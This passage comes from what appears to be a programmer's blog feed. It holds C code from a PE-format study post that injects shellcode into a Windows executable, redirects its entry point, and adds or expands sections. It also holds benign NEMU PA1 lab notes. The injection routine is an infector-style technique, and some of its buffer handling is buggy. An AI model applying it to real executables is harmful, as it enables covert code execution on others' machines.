PSectionHeader-&gt;PointerToRawData), (<span class="type">void</span>*)((<span class="type">char</span>*)Imagept + PSectionHeader-&gt;VirtualAddress), PSectionHeader-&gt;SizeOfRawData);</span><br><span class="line">    &#125;</span><br><span class="line">    *Filept = Filebuffer;</span><br><span class="line">    Filebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line">DWORD <span class="title function_">FilebufferCopytoPe</span><span class="params">(IN <span class="type">const</span> <span class="type">char</span>* name, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">void</span>* Filept)</span> &#123;</span><br><span class="line">    FILE* tempfp;</span><br><span class="line">    tempfp = fopen(name, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == tempfp) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;file open PE %s&quot;</span>, name);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fwrite(Filept, size, <span class="number">1</span>, tempfp);</span><br><span class="line">    fclose(tempfp);</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AddShellcode</span><span class="params">(IN <span class="type">void</span>* filebuffer)</span> &#123;</span><br><span class="line"></span><br><span class="line">    PIMAGE_DOS_HEADER PDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS PNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER PSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PDosHeader = (PIMAGE_DOS_HEADER)filebuffer;</span><br><span class="line">    <span class="keyword">if</span> (*(PWORD)PDosHeader != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeaders = (<span class="type">void</span>*)((<span class="type">char</span>*)filebuffer + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (*(PDWORD)(PNtHeaders) != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PSectionHeader = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)filebuffer + <span class="number">4</span> + IMAGE_SIZEOF_FILE_HEADER + PNtHeaders-&gt;FileHeader.SizeOfOptionalHeader + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//PSectionHeader = (PIMAGE_SECTION_HEADER)((char*)Filept + PimageDosHeader-&gt;e_lfanew + PNtHeads-&gt;FileHeader.SizeOfOptionalHeader + IMAGE_SIZEOF_FILE_HEADER + 4);</span></span><br><span class="line">    <span class="keyword">if</span> ((PSectionHeader-&gt;SizeOfRawData - *(PDWORD)PSectionHeader) &lt; size) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;to small&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD jmpaddress;</span><br><span class="line">    DWORD calladdress;</span><br><span class="line">    DWORD newenterypointer = PSectionHeader-&gt;VirtualAddress + PSectionHeader-&gt;Misc.VirtualSize + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;PSectionHeader-&gt;PointerToRawData%x\nPSectionHeader-&gt;Misc.VirtualSize%x\n&quot;</span>, PSectionHeader-&gt;PointerToRawData, PSectionHeader-&gt;Misc.VirtualSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//DWORD newenterypointer = 0x1a723;</span></span><br><span class="line"></span><br><span class="line">    calladdress = <span class="number">0x7672A820</span> - (<span class="number">8</span> + newenterypointer + <span class="number">5</span> + PNtHeaders-&gt;OptionalHeader.ImageBase);</span><br><span class="line">    jmpaddress = PNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint - (PSectionHeader-&gt;VirtualAddress + PSectionHeader-&gt;Misc.VirtualSize + <span class="number">1</span> + <span class="number">8</span> + <span class="number">5</span> + <span class="number">5</span>);</span><br><span class="line">    <span class="comment">//addressofneters是在内存中的位置</span></span><br><span class="line">    <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;call:%x\njmp:%x\n&quot;</span>, calladdress, jmpaddress);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;size:%d\n&quot;</span>, size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;shellcode[<span class="number">9</span>], &amp;calladdress, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;shellcode[<span class="number">14</span>], &amp;jmpaddress, <span class="number">4</span>);</span><br><span class="line">    <span class="comment">//printf(&quot;size:%d\n&quot;, size);</span></span><br><span class="line">    PNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint = newenterypointer;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(((<span class="type">char</span>*)(filebuffer)+PSectionHeader-&gt;PointerToRawData + PSectionHeader-&gt;Misc.VirtualSize + <span class="number">1</span>), shellcode, size);</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;size:%d\n&quot;</span>, size);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%X  &quot;</span>, shellcode[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, newenterypointer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">AddANewSection</span><span class="params">(IN <span class="type">void</span>* filebuffer, IN <span class="type">size_t</span> sizeoffilebuffer, OUT <span class="type">void</span>** newfilebuffer)</span> &#123;</span><br><span class="line">    PIMAGE_DOS_HEADER PDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS PNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER PSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER LastSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PDosHeader = (PIMAGE_DOS_HEADER)filebuffer;</span><br><span class="line">    <span class="keyword">if</span> (*(PWORD)PDosHeader != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeaders = (<span class="type">void</span>*)((<span class="type">char</span>*)filebuffer + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (*(PDWORD)(PNtHeaders) != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PSectionHeader = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)filebuffer + <span class="number">4</span> + IMAGE_SIZEOF_FILE_HEADER + PNtHeaders-&gt;FileHeader.SizeOfOptionalHeader + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    DWORD sectionsize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PNtHeaders-&gt;FileHeader.NumberOfSections; ++i) &#123;</span><br><span class="line">        sectionsize += IMAGE_SIZEOF_SECTION_HEADER;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((PNtHeaders-&gt;OptionalHeader.SizeOfHeaders - sectionsize - IMAGE_SIZEOF_FILE_HEADER - PNtHeaders-&gt;FileHeader.SizeOfOptionalHeader - PDosHeader-&gt;e_lfanew - <span class="number">4</span>) &lt; (<span class="number">2</span> * IMAGE_SIZEOF_SECTION_HEADER)) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;size too small&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeaders-&gt;OptionalHeader.SizeOfImage += AddNewSectionSize;</span><br><span class="line">    PNtHeaders-&gt;FileHeader.NumberOfSections += <span class="number">1</span>;</span><br><span class="line">    <span class="type">size_t</span> newfile_size = sizeoffilebuffer + AddNewSectionSize;</span><br><span class="line">    <span class="type">void</span>* tempnewfilebuffer = <span class="built_in">malloc</span>(newfile_size);<span class="comment">//需要判断是否申请成功，没写；</span></span><br><span class="line">    <span class="built_in">memset</span>(tempnewfilebuffer, <span class="number">0</span>, newfile_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(tempnewfilebuffer, filebuffer, sizeoffilebuffer);</span><br><span class="line">    IMAGE_SECTION_HEADER sectionsource;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;sectionsource, PSectionHeader, IMAGE_SIZEOF_SECTION_HEADER);</span><br><span class="line">    PIMAGE_SECTION_HEADER Psectionsource = &amp;sectionsource;</span><br><span class="line">    <span class="comment">//printf(&quot;%p,%p  &quot; ,&amp; sectionsource,Psectionsource);</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;sectionsource, <span class="string">&quot;.grxer&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;.grxer&quot;</span>));</span><br><span class="line">    <span class="comment">//(char*)Psectionsource = &quot;.grr&quot;;//这种赋值方式给的是常量字符串的地址，lea</span></span><br><span class="line">    <span class="comment">//printf(&quot;%p,%p&quot;, &amp;sectionsource, Psectionsource);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, sectionsource.Name);</span><br><span class="line">    sectionsource.Misc.VirtualSize = AddNewSectionSize;</span><br><span class="line">    <span class="comment">//LastSectionHeader =(PSectionHeader + PNtHeaders-&gt;FileHeader.NumberOfSections - 2);</span></span><br><span class="line">    LastSectionHeader = &amp;PSectionHeader[PNtHeaders-&gt;FileHeader.NumberOfSections - <span class="number">1</span>];</span><br><span class="line">    sectionsource.VirtualAddress = LastSectionHeader-&gt;VirtualAddress + LastSectionHeader-&gt;SizeOfRawData;<span class="comment">//there should use the max of SizeOfRawData and VirtualSize</span></span><br><span class="line">    sectionsource.SizeOfRawData = AddNewSectionSize;</span><br><span class="line">    sectionsource.PointerToRawData = LastSectionHeader-&gt;PointerToRawData + LastSectionHeader-&gt;SizeOfRawData;</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sectionsource.VirtualAddress);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(((<span class="type">char</span>*)tempnewfilebuffer + sectionsize + IMAGE_SIZEOF_FILE_HEADER + PNtHeaders-&gt;FileHeader.SizeOfOptionalHeader + PDosHeader-&gt;e_lfanew + <span class="number">4</span>), &amp;sectionsource, IMAGE_SIZEOF_SECTION_HEADER);</span><br><span class="line">    *newfilebuffer = tempnewfilebuffer;</span><br><span class="line">    tempnewfilebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> newfile_size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">ExpandTheLastSection</span><span class="params">(IN <span class="type">void</span>* filebuffer, IN <span class="type">size_t</span> sizeoffilebuffer, OUT <span class="type">void</span>** newfilebuffer)</span> &#123;</span><br><span class="line">    PIMAGE_DOS_HEADER PDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS PNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER PSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PDosHeader = (PIMAGE_DOS_HEADER)filebuffer;</span><br><span class="line">    PIMAGE_SECTION_HEADER PLastSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (*(PWORD)PDosHeader != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeaders = (<span class="type">void</span>*)((<span class="type">char</span>*)filebuffer + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (*(PDWORD)(PNtHeaders) != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PSectionHeader = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)filebuffer + <span class="number">4</span> + IMAGE_SIZEOF_FILE_HEADER + PNtHeaders-&gt;FileHeader.SizeOfOptionalHeader + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    PLastSectionHeader = &amp;PSectionHeader[PNtHeaders-&gt;FileHeader.NumberOfSections - <span class="number">1</span>];</span><br><span class="line">    <span class="type">size_t</span> finaddsize = (ExpandSectionSize / PNtHeaders-&gt;OptionalHeader.SectionAlignment) * PNtHeaders-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line">    <span class="keyword">if</span> ((ExpandSectionSize - finaddsize) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        finaddsize += PNtHeaders-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> newfilebuffersize = sizeoffilebuffer + finaddsize;</span><br><span class="line">    <span class="type">void</span>* tempnewfilebuffer = <span class="built_in">malloc</span>(newfilebuffersize);</span><br><span class="line">    <span class="built_in">memset</span>(tempnewfilebuffer, <span class="number">0</span>, newfilebuffersize);</span><br><span class="line">    <span class="comment">// 最后节表改大小注意对齐</span></span><br><span class="line">    PLastSectionHeader-&gt;SizeOfRawData += finaddsize;</span><br><span class="line">    PLastSectionHeader-&gt;Misc.VirtualSize += finaddsize;</span><br><span class="line">    <span class="comment">// 改sizeofiimage</span></span><br><span class="line">    PNtHeaders-&gt;OptionalHeader.SizeOfImage += finaddsize;</span><br><span class="line">    <span class="comment">//改属性</span></span><br><span class="line">    PLastSectionHeader-&gt;Characteristics |= PSectionHeader-&gt;Characteristics;</span><br><span class="line">    <span class="comment">//copy</span></span><br><span class="line">    <span class="built_in">memcpy</span>(tempnewfilebuffer, filebuffer, newfilebuffersize);</span><br><span class="line">    *newfilebuffer = tempnewfilebuffer;</span><br><span class="line">    tempnewfilebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;add %x byte&quot;</span>, finaddsize);</span><br><span class="line">    <span class="keyword">return</span> newfilebuffersize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>x86 NEMU PA1</title>
      <link href="/2023/05/13/x86-nemu-pa1/"/>
      <url>/2023/05/13/x86-nemu-pa1/</url>
      
        <content type="html"><![CDATA[<h1 id="NEMU-PA1"><a href="#NEMU-PA1" class="headerlink" title="NEMU PA1"></a>NEMU PA1</h1><p><a href="https://nju-projectn.github.io/ics-pa-gitbook/ics2020/PA1.html">https://nju-projectn.github.io/ics-pa-gitbook/ics2020/PA1.html</a></p><p>没用bash，用的fish</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">export NEMU_HOME=/mnt/hgfs/share/ics2020/nemu</span><br><span class="line">export AM_HOME=/mnt/hgfs/share/ics2020/abstract-machine</span><br><span class="line">source ~/.config/fish/config.fish</span><br></pre></td></tr></table></figure><p>abstruct machine 里change SIGSTKSZ to 8192</p><p>vscode 配置c_cpp_properties.json里一些预编译，来配置解析选项解锁正确的代码解析</p><p>可以用make -nB查看一下项目里原本定义的预编译宏</p><ul><li>-n 仅显示将要执行的命令，而不实际执行它们。</li><li>-B 表示 “always-make”，它告诉 make 忽略时间戳检查，强制重新构建目标文件</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 /m/h/s/i/nemu (pa1)&gt; make ARCH=x86-nemu ALL=dummy run -nB</span><br><span class="line">gcc -D__DIFF_REF_KVM__ -O2 -MMD -Wall -Werror -ggdb3 -I./include -I./src/engine/interpreter -D__ENGINE_interpreter__ -D__ISA__=x86 -D__ISA_x86__ -D_ISA_H_=\<span class="string">&quot;isa/x86.h\&quot;  -c -o build/obj-x86-interpreter/monitor/monitor.o src/monitor/monitor.c</span></span><br><span class="line"><span class="string">echo + CC src/isa/x86/decode.c</span></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//c_cpp_properties.json</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Linux&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;includePath&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$&#123;workspaceFolder&#125;/**&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;defines&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;__DIFF_REF_KVM__&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;__ENGINE_interpreter__&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;__ISA__=x86 &quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;__ISA_x86__&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;_ISA_H_=\&quot;isa/x86.h\&quot;&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;compilerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/bin/gcc&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c17&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cppStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gnu++17&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;intelliSenseMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux-gcc-x64&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;configurationProvider&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ms-vscode.makefile-tools&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>额，后来用了clangd做解析。。。。 bear –make自动生成数据库，好用尼</strong></p><p>或者，下面这个好像是专门给makefile用的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pip install compiledb</span><br><span class="line">compiledb -n make ARCH=x86-nemu ALL=dummy</span><br><span class="line"><span class="comment">//-n 表示no-build</span></span><br></pre></td></tr></table></figure><p>开始pa之旅:)</p><h2 id="寄存器结构体"><a href="#寄存器结构体" class="headerlink" title="寄存器结构体"></a>寄存器结构体</h2><p>利用匿名union和匿名struct去写</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Do NOT change the order of the GPRs&#x27; definitions. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In NEMU, rtlreg_t is exactly uint32_t. This makes RTL instructions</span></span><br><span class="line"><span class="comment">   * in PA2 able to directly access these registers.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">      <span class="type">uint32_t</span> _32;</span><br><span class="line">      <span class="type">uint16_t</span> _16;</span><br><span class="line">      <span class="type">uint8_t</span> _8[<span class="number">2</span>];</span><br><span class="line">    &#125; gpr[<span class="number">8</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">      <span class="type">rtlreg_t</span> eax, ecx, edx, ebx, esp, ebp, esi, edi;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="type">vaddr_t</span> pc;</span><br><span class="line">&#125; x86_CPU_state;</span><br></pre></td></tr></table></figure><h2 id="关于assert实现与封装"><a href="#关于assert实现与封装" class="headerlink" title="关于assert实现与封装"></a>关于assert实现与封装</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> assert(cond) <span class="keyword">if</span> (!(cond)) panic(...);</span></span><br></pre></td></tr></table></figure><p>上面写法在一些特殊情况是有问题的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (...) assert(xxx); <span class="comment">// 上面的assert对么？</span></span><br><span class="line"><span class="keyword">else</span> ...</span><br></pre></td></tr></table></figure><p>assert展开后下面的else会被宏里的if吸收，所以我们吸收后面的if是一个整体</p><p>nemu里采用了下面的写法</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> assert(cond) \</span></span><br><span class="line"><span class="meta">  do &#123; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (!(cond)) &#123; \</span></span><br><span class="line"><span class="meta">      fprintf(stderr, <span class="string">&quot;Fail @ %s:%d&quot;</span>, __FILE__, __LINE__); \</span></span><br><span class="line"><span class="meta">      exit(1); \</span></span><br><span class="line"><span class="meta">    &#125; \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>GNU提供C语言扩展<code>(&#123; ... &#125;)</code>来吧这个语句当作整体,但这不是c标准</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> assert(cond) (&#123; ... &#125;)</span></span><br></pre></td></tr></table></figure><p>去看了一下glibc2.35的源码，依旧存在<code>#define assert(cond) if (!(cond)) panic(...);</code>的写法，但是基本上后面都没有else，但或许是个隐患</p><h2 id="info-r"><a href="#info-r" class="headerlink" title="info r"></a>info r</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_info</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">strncmp</span>(<span class="string">&quot;r&quot;</span>, args, <span class="number">1</span>)) &#123;</span><br><span class="line">    isa_reg_display();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">isa_reg_display</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%s:0x%x\t\033[0m &quot;</span>, regsl[i], cpu.gpr[i]._32);</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">3</span>) <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;33m\n%s:0x%x\n\033[0m&quot;</span>, <span class="string">&quot;pc&quot;</span>, cpu.pc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="si-N"><a href="#si-N" class="headerlink" title="si N"></a>si N</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_si</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">NULL</span> != args) &#123;</span><br><span class="line">    cpu_exec(strtoul(args, <span class="literal">NULL</span>, <span class="number">10</span>));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cpu_exec(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x-N-EXPR"><a href="#x-N-EXPR" class="headerlink" title="x N EXPR"></a>x N EXPR</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_x</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">  <span class="type">int</span> times = atoi(strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>));</span><br><span class="line">  <span class="type">vaddr_t</span> address = (<span class="type">vaddr_t</span>)strtoul(strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>), <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; times; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == i % <span class="number">4</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34m%08x: \033[0m&quot;</span>, address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%08x  &quot;</span>, vaddr_read(address, <span class="number">4</span>));</span><br><span class="line">    address += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == (i+<span class="number">1</span>) % <span class="number">4</span>)<span class="comment">//在地址输出前输出换行</span></span><br><span class="line">      <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(times%<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="p-表示式求值"><a href="#p-表示式求值" class="headerlink" title="p 表示式求值"></a>p 表示式求值</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> Add more token types */</span></span><br><span class="line">    TK_NOTYPE = <span class="number">256</span>,</span><br><span class="line">    TK_EQ = <span class="number">1</span>,</span><br><span class="line">    TK_DEC = <span class="number">2</span>,</span><br><span class="line">    TK_ADD = <span class="number">3</span>,</span><br><span class="line">    TK_SUB = <span class="number">4</span>,</span><br><span class="line">    TK_MUL = <span class="number">5</span>,</span><br><span class="line">    TK_DIV = <span class="number">6</span>,</span><br><span class="line">    TK_BRAL = <span class="number">7</span>,</span><br><span class="line">    TK_BRAR = <span class="number">8</span>,</span><br><span class="line">    TK_DEREF = <span class="number">9</span>,</span><br><span class="line">    TK_HEX = <span class="number">10</span>,</span><br><span class="line">    TK_REG=<span class="number">11</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">rule</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *regex;</span><br><span class="line">    <span class="type">int</span> token_type;</span><br><span class="line">&#125; rules[] = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> Add more rules.</span></span><br><span class="line"><span class="comment">     * Pay attention to the precedence level of different rules.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &#123;<span class="string">&quot;0[xX][0-9a-fA-F]+&quot;</span>, TK_HEX&#125;,<span class="comment">//这个要比十进制靠前，不然会被十进制把0x的0给匹配走</span></span><br><span class="line">    &#123;<span class="string">&quot;[0-9]+&quot;</span>, TK_DEC&#125;, &#123;<span class="string">&quot; +&quot;</span>, 